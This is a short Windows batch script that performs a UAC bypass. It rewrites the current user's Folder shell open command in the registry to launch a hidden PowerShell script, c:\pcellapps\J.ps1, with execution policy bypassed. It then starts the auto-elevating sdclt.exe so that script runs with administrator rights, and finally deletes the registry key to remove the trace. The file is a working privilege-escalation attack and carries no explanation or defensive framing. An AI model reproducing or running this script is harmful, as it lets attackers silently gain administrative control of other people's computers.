@echo off
TIMEOUT 10
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "powershell.exe -ep bypass -windowstyle hidden -noexit -file c:\pcellapps\J.ps1" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v "DelegateExecute" /f
TIMEOUT 10
%windir%\system32\sdclt.exe
TIMEOUT 10
reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f